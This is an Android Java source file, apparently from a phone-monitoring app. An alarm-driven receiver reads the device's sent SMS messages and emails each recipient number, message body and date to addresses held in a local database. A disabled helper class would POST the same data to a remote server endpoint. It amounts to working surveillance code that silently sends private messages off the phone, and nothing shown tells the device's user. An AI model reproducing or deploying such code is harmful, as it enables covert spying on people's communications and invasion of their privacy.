package voluntaty.com.base;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.widget.Toast;

import com.voluntary.database.DataHelper;
import com.voluntary.record.audio.phone.SendMailTask;

import org.apache.http.NameValuePair;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

/**
 * Created by supergoga on 1/25/2016.
 */
public class RepeatingAlarmServiceInputSMS extends BroadcastReceiver {
    String login = null;
    String email = null;
    String password = null;

    private int inputsms = 0;

    ArrayList<Integer> list = null;
    private DataHelper dh;

    String URL_HTTP = null;
    //***************************

    public static boolean isNetworkConnectedOrConnecting(Context context) {
        final ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnectedOrConnecting();
    }
    @Override
    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnectedOrConnecting(context.getApplicationContext())) {
            someTask(context);
        }
    }


    void someTask(Context context) {

        dh = null;
        dh = new DataHelper(context);

        String servicesms;
        servicesms = null;

        servicesms = dh.selectServicesms("1");

     //   Toast.makeText(context.getApplicationContext(),"SMSInput", Toast.LENGTH_LONG).show();

        if(servicesms.length()>0) {

            URL_HTTP = dh.selectUrl_Http();
            String strt1 = null;
            strt1 = dh.selectGps();
            login = dh.selectLogin();
            email = dh.selectEmail();
            password = dh.selectPassword();
            list = new ArrayList<Integer>();
            String selectinputsms = null;


            inputsms = Integer.parseInt(dh.selectInputSMS());

            ContentResolver contentResolver3 = null;
            contentResolver3 = context.getContentResolver();
            Cursor cursor3 = null;
            cursor3 = contentResolver3.query(Uri.parse("content://sms/sent"), null, null, null, null);


            int indexBody3 = cursor3.getColumnIndex("body");
            int indexAddr3 = cursor3.getColumnIndex("address");
            int idDate3 = cursor3.getColumnIndex("date");


            SimpleDateFormat format3 = new SimpleDateFormat("HH:mm:ss dd.MM.yyyy");

            int i3 = 0;
            int res = 0;
            if (indexBody3 < 0 || !cursor3.moveToFirst()) return;


            do {

                int idcmc = Integer.parseInt("" + cursor3.getLong(0));
                if (idcmc > inputsms) {
                    list.add(Integer.parseInt("" + cursor3.getLong(0)));
                    // Toast.makeText(getApplicationContext(),"1"+email+" "+cursor3.getString(indexAddr3)+" "+cursor3.getString(indexBody3)+" "+format3.format(cursor3.getLong(4)) , Toast.LENGTH_LONG).show();
     //  new RequestTask().execute(email, cursor3.getString(indexAddr3), cursor3.getString(indexBody3), format3.format(cursor3.getLong(4)), URL_HTTP);

                    List<String> toEmailList = Arrays.asList(email.split("\\s*,\\s*"));
                    String s = null;
                    String s2 = null;
                    s = new String("InputSMS&"+cursor3.getString(indexAddr3)+" &"+cursor3.getString(indexBody3)+" &"+format3.format(cursor3.getLong(4)));
                    byte[] utf8Bytes = new byte[0];
                    try {
                        utf8Bytes = s.getBytes("UTF8");
                    } catch (UnsupportedEncodingException e) {
                        e.printStackTrace();
                    }
                    try {
                        s2 = new String(utf8Bytes, "UTF8");
                    } catch (UnsupportedEncodingException e) {
                        e.printStackTrace();
                    }
                   new SendMailTask().execute(email,password,toEmailList, "Spisok Input SMS", s2);
 //Toast.makeText(context.getApplicationContext(),s2, Toast.LENGTH_LONG).show();

                    s2 = null;
                    s = null;

                    res++;
                }

                i3++;
            }
            while (cursor3.moveToNext());
            if (res > 0) {
                Collections.sort(list);
                Integer endcmc = list.get(list.size() - 1);
                dh.InsertInputSMS("" + endcmc);
            }
            //      dh = null;
            URL_HTTP = null;
            strt1 = null;
            login = null;
            email = null;
            password = null;
            list = null;
            selectinputsms = null;
        }
        servicesms = null;
        dh = null;

// Toast.makeText(getApplicationContext()," InputSMS", Toast.LENGTH_LONG).show();

    }


    class RequestTask extends AsyncTask<String, String, String> {
        private String str2 = null;

        @Override
        protected String doInBackground(String... params) {

            try {
                // создаем запрос на сервер
                DefaultHttpClient hc = new DefaultHttpClient();
                ResponseHandler<String> res = new BasicResponseHandler();
                // он у нас будет посылать post запрос
                HttpPost postMethod = new HttpPost(params[4] + "/index.php/api/insert_smsinput");
                // будем передавать два параметра
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(4);
                //0

                nameValuePairs.add(new BasicNameValuePair("email", params[0]));
                nameValuePairs.add(new BasicNameValuePair("nomer", params[1]));

                //	String str = new String (br.readLine().toString().getBytes(),"UTF-8");

                nameValuePairs.add(new BasicNameValuePair("message", params[2]));
                nameValuePairs.add(new BasicNameValuePair("datamessage", params[3]));

                // собераем их вместе и посылаем на сервер
                postMethod.setEntity(new UrlEncodedFormEntity(nameValuePairs, "UTF-8"));
                // получаем ответ от сервера
                String response = hc.execute(postMethod, res);

                //	JSONURL(response.toString());

            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }


            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //dialog.dismiss();
            super.onPostExecute(result);
            // 			Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }
}




